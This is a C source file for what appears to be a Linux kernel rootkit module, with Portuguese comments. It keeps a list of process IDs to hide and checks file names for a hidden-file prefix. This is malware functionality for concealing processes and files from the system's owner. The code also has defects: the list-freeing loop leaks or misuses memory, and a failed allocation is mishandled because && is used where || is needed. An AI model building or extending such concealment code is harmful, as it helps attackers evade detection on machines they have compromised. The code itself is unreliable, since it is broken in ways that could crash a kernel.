// PID DYNAMIC LIST 
 
#include <linux/module.h>
#include <linux/slab.h>
#include "include/fdlib.h"


// retorna ultimo elemento
hidden_pid_t* last_hidden_pid(void){
   hidden_pid_t *last_pid = NULL;
   for(last_pid=hidden_pid_list; last_pid->next != NULL ; last_pid=last_pid->next);
   return last_pid;
}
// retorna um struct hidden_pid_t livre  is_free=1
hidden_pid_t* get_free_hidden_pid(void){
  hidden_pid_t *free_pid;
  for(free_pid=hidden_pid_list; free_pid != NULL ; free_pid=free_pid->next){
      if(free_pid->is_free == 1)
         return free_pid;
   }

   return NULL;
}

// retorna um struct hidden_pid_t pelo seu valor de pid_t
hidden_pid_t* get_hidden_pid(pid_t pid) {
   hidden_pid_t *pid_obj = NULL;
   for(pid_obj=hidden_pid_list; pid_obj != NULL ; pid_obj=pid_obj->next){
       if(pid_obj->pid == pid && pid_obj->is_free == 0){
           return pid_obj;
       }
   }

   return NULL;
}

void free_pid_list(void){
   hidden_pid_t *pid_obj = NULL;
   hidden_pid_t *next_pid = NULL;
   for(pid_obj=hidden_pid_list; pid_obj != NULL ; next_pid= pid_obj->next){
      kfree(pid_obj);
      pid_obj=next_pid;
   }
 

}
int is_hidden_pid(pid_t pid){
   hidden_pid_t *pid_obj = get_hidden_pid(pid);
   return (pid_obj != NULL);
}

int init_pid_list(void){
   hidden_pid_list = kmalloc( sizeof(hidden_pid_t), GFP_KERNEL );
   if(hidden_pid_list == NULL)
       return -1;
   hidden_pid_list->is_free = 0;
   hidden_pid_list->pid = 0;
   hidden_pid_list->next = NULL;
   
   return 0;
}
// adiciona um pid a ser ocultado
int add_hidden_pid(pid_t pid){
   hidden_pid_t *new_pid; 
   hidden_pid_t *last_pid;
   new_pid =  get_free_hidden_pid();
   if(new_pid != NULL){
      new_pid->pid = pid;
      new_pid->is_free = 0;
   }
   else{
      new_pid = kmalloc( sizeof(hidden_pid_t), GFP_KERNEL);
      last_pid = last_hidden_pid();
      if(new_pid == NULL && last_pid == NULL)
          return -1;
      new_pid->pid = pid;
      new_pid->is_free = 0;
      new_pid->next = NULL;
      last_pid->next = new_pid;
   }
   
 return 0;
}
// remove um pid da lista
int remove_hidden_pid(pid_t pid){
   hidden_pid_t *pid_toremove = get_hidden_pid(pid);
   if(pid_toremove == NULL)
      return -1;
   pid_toremove->is_free = 1;
   return 0;
}

int is_hidden_file(char *filename){
   if(strstr(filename, PREFIX_HIDDEN_FILE) != NULL){
     return 1;
  }
  return 0;
}

